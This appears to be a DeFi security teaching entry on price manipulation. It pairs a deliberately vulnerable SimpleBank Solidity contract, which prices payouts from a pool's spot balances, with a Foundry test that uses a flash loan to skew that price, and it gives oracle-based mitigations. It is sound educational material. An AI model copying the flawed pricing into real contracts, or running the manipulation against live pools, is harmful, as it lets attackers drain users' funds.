# Price manipulation

**Name:** Price manipulation

**Description:** Incorrect price calculation over balanceOf, getReverse may refer to a situation where the price of a token or asset is not accurately calculated based on the balanceOf function.

**Mitigation:**

Use a manipulation resistant oracle, chainlink, TWAP, etc.

**REF:**

https://twitter.com/1nf0s3cpt/status/1673948842738487296

https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price

https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation

https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation

**SimpleBank Contract:**

```jsx
contract SimpleBank {
    IERC20 public token; //USDA
    SimplePool public pool;
    IERC20 public payoutToken; //USDb

    constructor(address _token, address _pool, address _payoutToken) {
        token = IERC20(_token);
        pool = SimplePool(_pool);
        payoutToken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = pool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutToken.transfer(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
```

***\*How to Test:\****

forge test --contracts src/test/**Price_manipulation.sol** -vvvv

```jsx
// Function to test a potential price manipulation vulnerability
    function testPrice_Manipulation() public {
        // Transfers 9000 ether (using ether as a denomination here but it actually refers to the USDb token's smallest unit) to the SimpleBankContract from the USDbContract
        USDbContract.transfer(address(SimpleBankContract), 9000 ether);
        
        // Transfers 1000 ether worth of USDa tokens to the SimplePoolContract from the USDaContract
        USDaContract.transfer(address(SimplePoolContract), 1000 ether);
        
        // Transfers 1000 ether worth of USDb tokens to the SimplePoolContract from the USDbContract
        USDbContract.transfer(address(SimplePoolContract), 1000 ether);
        
        // Retrieves the current price of USDa in terms of USDb from the SimplePoolContract
        // Initially, the price is assumed to be 1 USDa : 1 USDb
        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb

        // Logs the assumption that the price of USDa is 1 to 1 USDb because the pool has 1000 of each
        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        
        // Emits a log with the current USDa conversion rate
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimplePoolContract.getPrice(),
            18
        );
        
        // Logs the start of the price manipulation attempt
        console.log("Start price manipulation");
        
        // Logs a message about borrowing 500 USDb via a flash loan
        console.log("Borrow 500 USBa over floashloan");
        
        // Attempts to manipulate the price by using a flash loan to borrow 500 USDb
        // This could potentially distort the balance of USDa and USDb in the SimplePoolContract, affecting the price
        SimplePoolContract.flashLoan(500 ether, address(this), "0x0");
    }
```

**Red box: price manipulated.**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6e72f9da-a310-4e12-a4df-724cfe5a4cd0%2FUntitled.png?table=block&id=4982af62-42fa-4aef-ac03-b62eb5514bc9&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)